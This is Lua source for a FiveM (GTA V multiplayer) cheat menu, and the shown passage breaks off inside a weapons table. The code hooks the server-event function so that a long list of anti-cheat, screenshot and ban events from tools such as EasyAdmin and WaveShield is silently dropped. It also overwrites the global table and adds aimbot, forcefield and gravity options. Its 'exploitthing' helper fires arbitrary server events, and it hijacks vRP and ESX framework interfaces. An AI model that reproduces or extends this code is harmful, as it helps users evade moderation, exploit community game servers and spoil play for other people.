-- open key is pageup

local c = Citizen
local d = {
    GB = {},
    Main = {
        GuestThread = c.CreateThread,
        GuestWait = c.Wait,
        GuestInv = c.InvokeNative,
        GuestRRA = c.ReturnResultAnyway,
        GuestPointerValue = c.PointerValueInt,
        GuestPVV = c.PointerValueVector,
        GuestRAF = c.ResultAsFloat,
        GuestRAS = c.ResultAsString,
        GuestRAL = c.ResultAsLong,
        GuestRAV = c.ResultAsVector,
        GuestRAI = c.ResultAsInteger,
        GuestRAO = c.ResultAsObject,
        GuestII = c.PointerValueIntInitialized,
        GuestEvent = TriggerServerEvent,
        GuestGetDuiHandle = GetDuiHandle,
        GuestCreateRuntimeTextureFromDuiHandle = CreateRuntimeTextureFromDuiHandle,
        GuestCreateRuntimeTxd = CreateRuntimeTxd,
        GuestToString = tostring,
        GuestToNum = tonumber,
        GuestAimMore = {
            GuestSetVehicleEngineTorqueMultiplier = SetVehicleEngineTorqueMultiplier,
            GuestSetVehicleEnginePowerMultiplier = SetVehicleEnginePowerMultiplier,
            GuestSetPlayerWeaponDamageModifier = SetPlayerWeaponDamageModifier,
            GuestSetPlayerMeleeWeaponDamageModifier = SetPlayerMeleeWeaponDamageModifier,
            GuestEntityPlayerIsFreeAimingAt = GetEntityPlayerIsFreeAimingAt,
            GuestSetPedShootsAtCoord = SetPedShootsAtCoord,
            GetGameplayCamCoord = GetGameplayCamCoord,
            GetDistanceBetweenCoords = sdfibdsfuyeazgazeazBetweenCoords,
            GetScreenCoordFromWorldCoord = GetScreenCoordFromWorldCoord,
            GuestResetEntityAlpha = ResetEntityAlpha,
            GuestIsEntityOnScreen = IsEntityOnScreen,
            GuestHasEntityClearLosToEntityInFront = HasEntityClearLosToEntityInFront,
            GuestGetCurrentPedWeapon = GetCurrentPedWeapon,
            GuestGetWeaponDamage = GetWeaponDamage
        },
        GuestCoroutine = {
            GustWrap = coroutine.wrap,
            GuestYield = coroutine.yield,
            GuestMetatable = setmetatable
        },
        GuestMath = {
            GustCeli = math.ceil,
            GuestFloor = math.floor,
            GuestSin = math.sin,
            GuestRad = math.rad,
            GuestAbs = math.abs,
            GuestCos = math.cos,
            GuestPi = math.pi,
            GuestSqrt = math.sqrt,
            GuestRand = math.random
        },
        GuestString = {
            GuestUpper = string.upper,
            GuestLower = string.lower,
            GuestFind = string.find,
            GuestSub = string.sub,
            GuestGSub = string.gsub,
            GuestChar = string.char
        },
        GuestTable = {
            GuestPack = table.pack,
            GuestInsert = table.insert,
            GuestUnPack = table.unpack,
            GuestSort = table.sort,
            GuestRemove = table.remove,
            GuestMsgPack = msgpack.pack,
            GuestMsgUnpack = msgpack.unpack
        }
    }
}
local e = {}
e.Bypasses = {
    Events = {
        "anticheese",
        "scrambler-vac:triggeredClientEvent",
        "ReportCheat",
        "mhacking:start",
        "mhacking:hide",
        "venomadmin:openmenucheck",
        "venomadmin:godmodecheck",
        "venomadmin:freezeplayercheck",
        "venomadmin:manageplayercheck",
        "venomadmin:invisibilitycheck",
        "venomadmin:unbancheck",
        "venomadmin:banplayercheck",
        "venomadmin:TakeScreenshot",
        "venomadmin:TookScreenshot",
        "ΑβΒγΓδΔεΕ",
        "fuhjizofzf4z5fza",
        "firstSpawnAC",
        "GlobalCheat",
        "οΟπΠρΡσςΣτΤυΥφΦχΧ",
        "mhacking:show",
        "mhacking:setmessage",
        "EasyAdmin:TookScreenshot",
        "EasyAdmin:requestBanlist",
        "EasyAdmin:requestSpectate",
        "EasyAdmin:banPlayer",
        "cortana:AddLog",
        "WaveShield:UpdateClient",
        "WaveShield:delgun",
        "WaveShield:loadClient",
        "bay_ac:ban",
        "GetScreenshotFromUser",
        "UwU:scrambler-vac:triggeredClientEvent",
        "UwU:violateReport",
        "UwU:scrambler-vac:triggeredClientEvent",
        "myAcSuckYourAssholeHacker",
        "BanSql:ICheatClient",
        "detectionf748esf4esf4se85de7des7fesf5ede8sf",
        "kakuhsdubhzuhbudzdz",
        "maisweshcuntokenca",
        "waveshieldbetterthanyounoob",
        "anticheat",
        "antilynx",
        "discordbot",
        "EasyAdmin:CaptureScreenshot",
        "screenshot",
        "cheat",
        "screenshot_basic:requestScreenshot",
        "EasyAdmin:CaptureScreenshot",
        "__cfx_nui:screenshot_created",
        "EasyAdmin:FreezePlayer",
        "ncpp",
        "ViolationDetected",
        "godModePass",
        "godModeFail",
        "adminGodmodeCheck",
        "illegalWeapon",
        "ybn_ac",
        "x_anticheat",
        "CMG:ban",
        "Choco:",
        "alpha-tango-golf",
        "AC_SYNC:BAN",
        "foundyou",
        "AntiBlips",
        "AntiSpectate",
        "CarlosLR-AC",
        "globalAC:trigger",
        "NWAC",
        "AC:Sanction",
        "ChXa"
    },
    Args = {
        {"This player tried to bypass the anticheat", "ChocoHax"},
        {"This player tried to stop the anticheat", "ChocoHax"},
        {"This player injected a mod menu", "ChocoHax"},
        {"ð??« AntiChocoStop", "ChocoHax"},
        {"ð??« AntiTeleport", "ChocoHax"},
        {"AntiSpectate", "ChocoHax"},
        {"AntiBlips", "ChocoHax"},
        {"ð??« Secly", "ChocoHax"},
        {"ChocoHax", "ChocoHax"},
        {"HentaiCore", "HentaiCore"},
        {"`ForceSocialClubUpdate` Removal", "ATG"},
        {"Ham Mafia Executor Detected", "ATG"},
        {"Table Emptying in Resource", "ATG"},
        {"Malicious Function Usage", "ATG"},
        {"Player Health above MAX", "ATG"},
        {"Weapon Damage Modified", "ATG"},
        {"Anti-Resource-Restart", "ATG"},
        {"Manipulation Detected", "ATG"},
        {"Native Draw Detection", "ATG"},
        {"Inventory Exploiting", "ATG"},
        {"GuestBIGSource detection", "ATG"},
        {"Injection detected", "ATG"},
        {"BlacklistedWeapon:", "ATG"},
        {"Anti-Resource-Stop", "ATG"},
        {"Godmode Activated", "ATG"},
        {"AntiModelChanger", "ATG"},
        {"Infinite Health", "ATG"},
        {"Menu Detection", "ATG"},
        {"Cheat Engine", "ATG"},
        {"#GetHammed", "ATG"},
        {"Native Function", "Sanction"},
        {"BAN", "Sanction"}
    },
    tfi = TriggerServerEventInternal,
    global = _G
}
function e.Bypasses:CheckEvent(f)
    for h, i in pairs(e.Bypasses.Events) do
        if f:lower():find(i:lower(), 1, true) then
            return true
        end
    end
    return false
end
function e.Bypasses:CheckArgs(j)
    for h, i in pairs(j) do
        if type(i) == "string" then
            for z, x in pairs(e.Bypasses.Args) do
                if x[1]:lower():find(i:lower(), 1, true) then
                    return true
                end
            end
        end
    end
    return false
end
function TriggerServerEventInternal(f, k, l)
    if e.Bypasses:CheckEvent(f) then
        return
    end
    local m =
        d.Main.GuestTable.GuestMsgUnpack(
        k
    )
    if e.Bypasses:CheckArgs(m) then
        return
    end
    return d.Main.GuestInv(0x7FDD1128, f, k, l)
end
CreateThread(
    function()
        for h, i in ipairs(e.Bypasses.global) do
            if h == "TriggerClientEventInt" or h == "HandleConfig" then
                d.Main.GuestTable.GuestRemove(
                    e.Bypasses.global,
                    i
                )
            end
        end
        while true do
            _G = e.Bypasses.global
            Wait(0)
        end
    end
)
local n = print
local function o(p)
    n("[GuestPrint] " .. p)
end
AimbotBoneOps = {"Head", "Chest", "Left Arm", "Right Arm", "Left Leg", "Right Leg", "Dick"}
AimbotBone = "SKEL_HEAD"
ForcefieldRadiusOps = {5.0, 10.0, 15.0, 20.0, 50.0}
ForcefieldRadius = 5.0
GravityOps = {0.0, 5.0, 9.8, 50.0, 100.0, 200.0, 500.0, 1000.0, 9999.9}
GravityOpsWords = {"0", "5", "Default", "50", "100", "200", "500", "1000", "9999"}
GravAmount = 9.8
local q = 1
local s = 1
local q = 1
local s = 1
local t = 3
local u = 3
local v = 1
local w = 1
local A = {
    ["ESC"] = 322,
    ["F1"] = 288,
    ["F2"] = 289,
    ["F3"] = 170,
    ["F5"] = 166,
    ["F6"] = 167,
    ["F7"] = 168,
    ["F8"] = 169,
    ["F9"] = 56,
    ["F10"] = 57,
    ["~"] = 243,
    ["1"] = 157,
    ["2"] = 158,
    ["3"] = 160,
    ["4"] = 164,
    ["5"] = 165,
    ["6"] = 159,
    ["7"] = 161,
    ["8"] = 162,
    ["9"] = 163,
    ["-"] = 84,
    ["="] = 83,
    ["BACKSPACE"] = 177,
    ["TAB"] = 37,
    ["Q"] = 44,
    ["W"] = 32,
    ["E"] = 38,
    ["R"] = 45,
    ["T"] = 245,
    ["Y"] = 246,
    ["U"] = 303,
    ["P"] = 199,
    ["["] = 39,
    ["]"] = 40,
    ["ENTER"] = 18,
    ["CAPS"] = 137,
    ["A"] = 34,
    ["S"] = 8,
    ["D"] = 9,
    ["F"] = 23,
    ["G"] = 47,
    ["H"] = 74,
    ["K"] = 311,
    ["L"] = 182,
    ["LEFTSHIFT"] = 21,
    ["Z"] = 20,
    ["X"] = 73,
    ["C"] = 26,
    ["V"] = 0,
    ["B"] = 29,
    ["N"] = 249,
    ["M"] = 244,
    [","] = 82,
    ["."] = 81,
    ["LEFTCTRL"] = 36,
    ["LEFTALT"] = 19,
    ["SPACE"] = 22,
    ["RIGHTCTRL"] = 70,
    ["HOME"] = 213,
    ["PAGEUP"] = 10,
    ["PAGEDOWN"] = 11,
    ["DELETE"] = 178,
    ["LEFT"] = 174,
    ["RIGHT"] = 175,
    ["TOP"] = 27,
    ["UP"] = 172,
    ["DOWN"] = 173,
    ["NENTER"] = 201,
    ["N4"] = 108,
    ["N5"] = 60,
    ["N6"] = 107,
    ["N+"] = 96,
    ["N-"] = 97,
    ["N7"] = 117,
    ["N8"] = 61,
    ["N9"] = 118,
    ["MOUSE1"] = 24
}
local B = false
local C = 5.0
local D = nil
local E = "Object Spooner"
local function F(G)
    if G then
        return G + .0
    else
        return 5391.0
    end
end
local GuestToString = function(H)
    if H == 0 or not H then
        return nil
    end
    return GuestToString(H)
end
local I = {
    shouldShowMenu = true,
    debug = false,
    natives = {
        SetMouseCursorActiveThisFrame = function(a)
            return d.Main.GuestInv(0xAAE7CE1D63167423, a)
        end,
        GetNuiCursorPosition = function()
            return d.Main.GuestInv(0x5F4B6931816E599B, a)
        end,
        EndTextCommandGetWidth = function(J)
            return d.Main.GuestInv(0x85F061DA64ED2F67, a)
        end,
        GetActiveScreenResolution = function(a)
            return d.Main.GuestInv(0x5F4B6931816E599B, a)
        end,
        DisableAllControlActions = function(a)
            return d.Main.GuestInv(0x873C9F3104101DD3, a)
        end,
        SetMouseCursorSprite = function(a)
            return d.Main.GuestInv(0x8DB8CFFD58B62552, a)
        end,
        getCurrentServerEndpoint = function()
            return d.Main.GuestInv(
                " 0xea11bfba ",
                d.Main.GuestRRA(),
                d.Main.GuestRAS()
            )
        end,
        getCurrentResourceName = function()
            return d.Main.GuestInv(
                " 0xe5e9ebbb ",
                d.Main.GuestRRA(),
                d.Main.GuestRAS()
            )
        end,
        GetActivePlayers = function()
            return d.Main.GuestTable.GuestMsgUnpack(
                d.Main.GuestInv(
                    " 0xcf143fb9 ",
                    d.Main.GuestRRA(),
                    d.Main.GuestRAO()
                )
            )
        end,
        clearPedTasksImmediately = function(K)
            return d.Main.GuestInv(" 0xAAA34F8A7CB32098 ", K)
        end,
        addTextComponentSubstringPlayerName = function(L)
            return d.Main.GuestInv(
                " 0x6C188BE134E074AA ",
                d.Main.GuestToString(L)
            )
        end,
        beginTextCommandDisplayText = function(L)
            return d.Main.GuestInv(
                " 0x25FBB336DF1804CB ",
                d.Main.GuestToString(L)
            )
        end,
        endTextCommandDisplayText = function(x, y)
            return d.Main.GuestInv(" 0xCD015E5BB0D96A57 ", x, y)
        end,
        loadResourceFile = function(M, N)
            return d.Main.GuestInv(
                " 0x76a9ee1f ",
                d.Main.GuestToString(M),
                d.Main.GuestToString(N),
                d.Main.GuestRRA(),
                d.Main.GuestRAS()
            )
        end,
        createObject = function(O, x, y, z, P, Q, R)
            return d.Main.GuestInv(
                " 0x509D5878EB39E842 ",
                O,
                x,
                y,
                z,
                P,
                thisScriptCheck,
                R,
                d.Main.GuestRRA(),
                d.Main.GuestRAI()
            )
        end,
        DrawRect = function(x, y, width, height, r, g, b, a)
            return d.Main.GuestInv(
                " 0x3A618A217E5154F0 ",
                x,
                y,
                width,
                height,
                r,
                g,
                b,
                a
            )
        end,
        d5cb04ddaa81e3685adb07e123e0631 = function(x, y, z, S, T, U, V, W)
            return d.Main.GuestInv(
                " 0xE3AD2BDBAEE269AC ",
                x,
                y,
                z,
                S,
                T,
                U,
                V,
                W
            )
        end,
        d630f96fba91f00943f871c3b2b25 = function(X, U, V, Y)
            return d.Main.GuestInv(
                " 0x301A42153C9AD707 ",
                X,
                U,
                V,
                Y,
                d.Main.GuestRRA(),
                d.Main.GuestRAI()
            )
        end,
        d6900ec9e918eb1426be32868e2b0 = function(K, Z, _, a0, a1)
            return d.Main.GuestInv(
                " 0xBF0FD6E56C964FCB ",
                K,
                Z,
                _,
                a0,
                a1
            )
        end,
        addTextEntry = function(a2, a3)
            return d.Main.GuestInv(
                " 0x32ca01c3 ",
                d.Main.GuestToString(a2),
                d.Main.GuestToString(a3)
            )
        end,
        displayOnscreenKeyboard = function(a4, a5, a6, a7, a8, a9, aa, ab)
            return d.Main.GuestInv(
                " 0x00DC833F2568DBF6 ",
                a4,
                d.Main.GuestToString(a5),
                d.Main.GuestToString(a6),
                d.Main.GuestToString(a7),
                d.Main.GuestToString(a8),
                d.Main.GuestToString(a9),
                d.Main.GuestToString(aa),
                ab
            )
        end,
        updateOnscreenKeyboard = function()
            return d.Main.GuestInv(
                " 0x0CF2B696BBF945AE ",
                d.Main.GuestRRA(),
                d.Main.GuestRAI()
            )
        end,
        getVehicleXenonLightsColour = function(X)
            return d.Main.GuestInv(
                " 0x3DFF319A831E0CDB ",
                X,
                d.Main.GuestRRA(),
                d.Main.GuestRAI()
            )
        end,
        setVehicleXenonLightsColour = function(X, color)
            return d.Main.GuestInv(
                " 0xE41033B25D003A07 ",
                X,
                color
            )
        end,
        doesExtraExist = function(X, ac)
            return d.Main.GuestInv(
                " 0x1262D55792428154 ",
                X,
                ac,
                d.Main.GuestRRA()
            )
        end,
        a5a42faa7cf2d2e6ec9530df349f5a7 = function(entity, ad, ae)
            return d.Main.GuestInv(
                " 0xEA1C610A04DB6BBB ",
                entity,
                ad,
                ae
            )
        end,
        e087206cc908106f5b9548005fa39fd = function(O, x, y, z, af, P, thisScriptCheck)
            return d.Main.GuestInv(
                " 0xAF35D0D2583051B0 ",
                O,
                x,
                y,
                z,
                af,
                P,
                thisScriptCheck,
                d.Main.GuestRRA(),
                d.Main.GuestRAI()
            )
        end,
        c3188c79a068242c231f422e25ebbae = function(entity, xPos, yPos, zPos, ag, ah, ai, aj)
            return d.Main.GuestInv(
                " 0x06843DA7060A026B ",
                entity,
                xPos,
                yPos,
                zPos,
                ag,
                ah,
                ai,
                aj
            )
        end,
        c3188c79a068242c231f422e25ebbaeNoOffset = function(entity, xPos, yPos, zPos, ag, ah, ai)
            return d.Main.GuestInv(
                " 0x239A3351AC1DA385 ",
                entity,
                xPos,
                yPos,
                zPos,
                ag,
                ah,
                ai
            )
        end,
        shootSingleBulletBetweenCoords = function(x1, y1, z1, x2, y2, ak, al, am, Z, an, U, V, speed)
            return d.Main.GuestInv(
                " 0x867654CBC7606F2C ",
                x1,
                y1,
                z1,
                x2,
                y2,
                ak,
                al,
                am,
                GetHashKey(Z),
                an,
                U,
                V,
                speed
            )
        end,
        adc12da2eac5ceb7b3e53abdbb48 = function(entity, health)
            return d.Main.GuestInv(
                " 0x6B76DC1F3AE6E6A3 ",
                entity,
                health
            )
        end,
        e1281c561cf4fcae7c62d471d8 = function(K, ao)
            return d.Main.GuestInv(" 0xCEA04D83135264CC ", K, ao)
        end,
        setTextFont = function(ap)
            return d.Main.GuestInv(" 0x66E0276CC5F6B9DA ", ap)
        end,
        setTextColour = function(aq, ar, as, at)
            return d.Main.GuestInv(
                " 0xBE6B23FFA53FB442 ",
                aq,
                ar,
                as,
                at
            )
        end,
        setTextScale = function(au, av)
            return d.Main.GuestInv(" 0x07C837F9A01C34C9 ", au, av)
        end,
        setTextDropShadow = function()
            return d.Main.GuestInv(" 0x1CA3E9EAC9D93E5E ")
        end,
        e8ae1a79d1d9cbb6 = function(aw, ax, ay, Y)
            return d.Main.GuestInv(
                " 0x67C540AA08E4A6F5 ",
                aw,
                d.Main.GuestToString(ax),
                d.Main.GuestToString(ay),
                Y
            )
        end,
        RequestStreamedTextureDict = function(az, aA)
            return d.Main.GuestInv(
                " 0xDFA2EF8E04127DD5 ",
                d.Main.GuestToString(az),
                aA
            )
        end,
        setTextProportional = function(a4)
            return d.Main.GuestInv(" 0x038C1F517D7FDCF8 ", a4)
        end,
        setTextOutline = function()
            return d.Main.GuestInv(" 0x2513DFB0FB8400FE ")
        end,
        isDisabledControlPressed = function(aB, aC)
            return d.Main.GuestInv(" 0xE2587F8CBBD87B1D ", aB, aC)
        end,
        setArtificialLightsState = function(aD)
            return d.Main.GuestInv(" 0x1268615ACE24D504 ", aD)
        end
    },
    rgb = {r = 255, g = 255, b = 255},
    rgb1 = {r = 255, g = 255, b = 255},
    rgb2 = {r = 255, g = 255, b = 255},
    GuestCurrentUI = {
        GuestShit = {},
        keys = {up = A["UP"], down = A["DOWN"], left = A["LEFT"], right = A["RIGHT"], select = A["NENTER"], back = 202},
        optionCount = 0,
        maximumOptionCount = 15,
        currentKey = nil,
        currentMenu = nil,
        titleHeight = 0.0525,
        titleYOffset = 0.00485,
        titleXOffset = 0.15,
        titleScale = 0.7,
        titleSpacing = 2,
        buttonHeight = 0.035,
        buttonFont = 0,
        buttonScale = 0.360,
        _mVersion = "",
        buttonTextYOffset = 0.003,
        buttonTextXOffset = 0.0025,
        selectedUIRainbow = false,
        selectedCheckboxStyle = "New",
        availableCheckboxStyles = {"New", "Old"},
        menu_TextOutline = true,
        menu_TextDropShadow = true,
        menu_RectOverlay = false,
        selectedUI = "Original",
        themeUI = {"Original", "Lite", "Blue", "Green", "Purple", "Red", "Orange", "RGB"},
        rainbowValue = 0
    },
    BottomText = nil,
    Cache = {},
    functions = {},
    NewFunction = {},
    FunctionTables = {},
    menus_list = {},
    GuestNotif = {},
    Guestdata = {
        pLocalPlayer = {cVehicle = 0, pedId = 0, should2stepAutist = false},
        es_extended = nil,
        ESX = nil,
        trainRide = {handleHasLoaded = true, handle = nil, oldCoords = nil, trainSpeed = 5.0},
        savedVehiclesOptionsHandle = nil,
        savedVehiclesOptionsDeleteHandle = nil
    },
    mainColor = {r = 225, g = 55, b = 55, a = 255},
    menuTabsColors = {
        selfOptions = {r = 255, g = 255, b = 255},
        onlineOptions = {r = 255, g = 255, b = 255},
        visualOptions = {r = 255, g = 255, b = 255},
        teleportOptions = {r = 255, g = 255, b = 255},
        vehicleOptions = {r = 255, g = 255, b = 255},
        weaponOptions = {r = 255, g = 255, b = 255},
        serverOptions = {r = 255, g = 255, b = 255},
        menuOptions = {r = 255, g = 255, b = 255}
    }
}
I.exploitthing = function(aE, aF, f, ...)
    if aE then
        I.CreateThread(
            function()
                d.Main.GuestWait(50)
            end
        )
    end
    local k =
        d.Main.GuestTable.GuestMsgPack(
        {...}
    )
    if aF then
        TriggerServerEventInternal(f, k, k:len())
    else
        TriggerEventInternal(f, k, k:len())
    end
end
local aG = {}
local aH = {}
local function aI(aJ)
    aH = aJ
end
local function aK(aL, aM)
    local aN = getmetatable(aL).name
    local aO = function(j, aP)
        if j == nil then
            j = {}
        end
        I.exploitthing(false, false, aN .. ":f56ec2ab97d604832d90f6394e3f341f", aM, j, aI)
        return d.Main.GuestTable.GuestUnPack(
            aH
        )
    end
    aL[aM] = aO
    return aO
end
function aG.be577abf92a5605a535aa73a8a2d(aQ, aL)
    AddEventHandler(
        aQ .. ":f56ec2ab97d604832d90f6394e3f341f",
        function(aR, j, aP)
            local aS = aL[aR]
            if type(aS) == "function" then
                aP(
                    {
                        aS(
                            d.Main.GuestTable.GuestUnPack(
                                j
                            )
                        )
                    }
                )
            else
            end
        end
    )
end
function aG.a53984adb4d443ef1db5da1683ae5a(aQ)
    local r =
        d.Main.GuestCoroutine.GuestMetatable(
        {},
        {__index = aK, name = aQ}
    )
    return r
end
local aT = 0
local aU = {}
local aV = {}
function aU.newdf9b5a9238ea317684c619109968f01f()
    local r =
        d.Main.GuestCoroutine.GuestMetatable(
        {},
        {__index = aV}
    )
    r:construct()
    return r
end
function aV:construct()
    self:clear()
end
function aV:clear()
    self.max = 0
    self.ids = {}
end
function aV:gen()
    if #self.ids > 0 then
        return d.Main.GuestTable.GuestRemove(
            self.ids
        )
    else
        local r = self.max
        self.max = self.max + 1
        return r
    end
end
function aV:free(aW)
    d.Main.GuestTable.GuestInsert(
        self.ids,
        aW
    )
end
local aX = {}
local function aY(aL, aM)
    local aZ = getmetatable(aL)
    local aN = aZ.name
    local a_ = aZ.eebee9ab199d3cc4d44e19b341b65b7d_ids
    local b0 = aZ.eebee9ab199d3cc4d44e19b341b65b7d_callbacks
    local b1 = aZ.identifier
    local aO = function(j, aP)
        if j == nil then
            j = {}
        end
        if type(aP) == "function" then
            local b2 = a_:gen()
            b0[b2] = aP
            I.exploitthing(false, true, aN .. ":eebee9ab199d3cc4d44e19b341b65b7d_req", aM, j, b1, b2)
        else
            I.exploitthing(false, true, aN .. ":eebee9ab199d3cc4d44e19b341b65b7d_req", aM, j, "", -1)
        end
    end
    aL[aM] = aO
    return aO
end
function aX.bindInterface(aQ, b3)
    RegisterNetEvent(aQ .. ":eebee9ab199d3cc4d44e19b341b65b7d_req")
    AddEventHandler(
        aQ .. ":eebee9ab199d3cc4d44e19b341b65b7d_req",
        function(aR, j, b1, b2)
            local aS = b3[aR]
            local aE = false
            local b4 = {}
            if type(aS) == "function" then
                eebee9ab199d3cc4d44e19b341b65b7d_DELAYED = function()
                    aE = true
                    return function(b4)
                        b4 = b4 or {}
                        if b2 >= 0 then
                            I.exploitthing(
                                false,
                                true,
                                aQ .. ":" .. b1 .. ":eebee9ab199d3cc4d44e19b341b65b7d_res",
                                b2,
                                b4
                            )
                        end
                    end
                end
                b4 = {
                    aS(
                        d.Main.GuestTable.GuestUnPack(
                            j
                        )
                    )
                }
            end
            if not aE and b2 >= 0 then
                I.exploitthing(false, true, aQ .. ":" .. b1 .. ":eebee9ab199d3cc4d44e19b341b65b7d_res", b2, b4)
            end
        end
    )
end
function aX.a53984adb4d443ef1db5da1683ae5a(aQ, b1)
    local a_ = aU.newdf9b5a9238ea317684c619109968f01f()
    local b0 = {}
    local r =
        d.Main.GuestCoroutine.GuestMetatable(
        {},
        {
            __index = aY,
            name = aQ,
            eebee9ab199d3cc4d44e19b341b65b7d_ids = a_,
            eebee9ab199d3cc4d44e19b341b65b7d_callbacks = b0,
            identifier = b1
        }
    )
    RegisterNetEvent(aQ .. ":" .. b1 .. ":eebee9ab199d3cc4d44e19b341b65b7d_res")
    AddEventHandler(
        aQ .. ":" .. b1 .. ":eebee9ab199d3cc4d44e19b341b65b7d_res",
        function(b2, j)
            local aP = b0[b2]
            if aP ~= nil then
                a_:free(b2)
                b0[b2] = nil
                aP(
                    d.Main.GuestTable.GuestUnPack(
                        j
                    )
                )
            end
        end
    )
    return r
end
local b5 = aG.a53984adb4d443ef1db5da1683ae5a("vRP")
I.Guestdata.es_extended = I.natives.loadResourceFile("es_extended", "client/common.lua")
if
    I.Guestdata.es_extended and
        string.len(I.Guestdata.es_extended) > 65
 then
    local b6 = {
        "AddEventHandler",
        "cb",
        "function ",
        "exports",
        "return ESX",
        "return ExM",
        "getExtendedModeObject",
        "(ESX)",
        "function",
        "getSharedObject%(%)",
        "end",
        "%(",
        "%)",
        ",",
        "'",
        '"',
        "UG",
        "tonum",
        "\n",
        "%s+"
    }
    for b7 = 1, #b6 do
        I.Guestdata.es_extended =
            I.Guestdata.es_extended:gsub(b6[b7], "")
    end
end
WeathersList = {
    "CLEAR",
    "EXTRASUNNY",
    "CLOUDS",
    "OVERCAST",
    "RAIN",
    "CLEARING",
    "THUNDER",
    "SMOG",
    "FOGGY",
    "XMAS",
    "SNOWLIGHT",
    "BLIZZARD"
}
I.FunctionTables.weaponsTable = {
    Melee = {
        BaseballBat = {id = "weapon_bat", name = "~s~~s~Baseball Bat", bInfAmmo = false, mods = {}},
        BrokenBottle = {id = "weapon_bottle", name = "~s~~s~Broken Bottle", bInfAmmo = false, mods = {}},
        Crowbar = {id = "weapon_Crowbar", name = "~s~~s~Crowbar", bInfAmmo = false, mods = {}},
        Flashlight = {id = "weapon_flashlight", name = "~s~~s~Flashlight", bInfAmmo = false, mods = {}},
        GolfClub = {id = "weapon_golfclub", name = "~s~~s~Golf Club", bInfAmmo = false, mods = {}},
        BrassKnuckles = {id = "weapon_knuckle", name = "~s~~s~Brass Knuckles", bInfAmmo = false, mods = {}},
        Knife = {id = "weapon_knife", name = "~s~~s~Knife", bInfAmmo = false, mods = {}},
        Machete = {id = "weapon_machete", name = "~s~~s~Machete", bInfAmmo = false, mods = {}},
        Switchblade = {id = "weapon_switchblade", name = "~s~~s~Switchblade", bInfAmmo = false, mods = {}},
        Nightstick = {id = "weapon_nightstick", name = "~s~~s~Nightstick", bInfAmmo = false, mods = {}},
        BattleAxe = {id = "weapon_battleaxe", name = "~s~~s~Battle Axe", bInfAmmo = false, mods = {}}
    },
    Handguns = {
        Pistol = {
            id = "weapon_pistol",
            name = "~s~~s~Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_PISTOL_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_PISTOL_CLIP_02"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP_02"}}
            }
        },
        PistolMK2 = {
            id = "weapon_pistol_mk2",
            name = "~s~~s~Pistol MK 2",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_PISTOL_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_PISTOL_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT"},
                    {name = "~s~~s~FMJ Rounds", id = "COMPONENT_PISTOL_MK2_CLIP_FMJ"}
                },
                Sights = {{name = "~s~~s~Mounted Scope", id = "COMPONENT_AT_PI_RAIL"}},
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH_02"}},
                BarrelAttachments = {
                    {name = "~s~~s~Compensator", id = "COMPONENT_AT_PI_COMP"},
                    {name = "~s~~s~Suppessor", id = "COMPONENT_AT_PI_SUPP_02"}
                }
            }
        },
        CombatPistol = {
            id = "weapon_combatpistol",
            name = "~s~~s~Combat Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_COMBATPISTOL_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_COMBATPISTOL_CLIP_02"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        APPistol = {
            id = "weapon_appistol",
            name = "~s~~s~AP Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_APPISTOL_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_APPISTOL_CLIP_02"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP"}}
            }
        },
        StunGun = {id = "weapon_stungun", name = "~s~~s~Stun Gun", bInfAmmo = false, mods = {}},
        Pistol50 = {
            id = "weapon_pistol50",
            name = "~s~~s~Pistol .50",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_PISTOL50_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_PISTOL50_CLIP_02"}
                },
                Flashlight = {{name = "~s~~s~Flashlight", id = "COMPONENT_AT_PI_FLSH"}},
                BarrelAttachments = {{name = "~s~~s~Suppressor", id = "COMPONENT_AT_PI_SUPP_02"}}
            }
        },
        SNSPistol = {
            id = "weapon_snspistol",
            name = "~s~~s~SNS Pistol",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_SNSPISTOL_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_SNSPISTOL_CLIP_02"}
                }
            }
        },
        SNSPistolMkII = {
            id = "weapon_snspistol_mk2",
            name = "~s~~s~SNS Pistol Mk II",
            bInfAmmo = false,
            mods = {
                Magazines = {
                    {name = "~s~~s~Default Magazine", id = "COMPONENT_SNSPISTOL_MK2_CLIP_01"},
                    {name = "~s~~s~Extended Magazine", id = "COMPONENT_SNSPISTOL_MK2_CLIP_02"},
                    {name = "~s~~s~Tracer Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_TRACER"},
                    {name = "~s~~s~Incendiary Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY"},
                    {name = "~s~~s~Hollow Point Rounds", id = "COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT"},
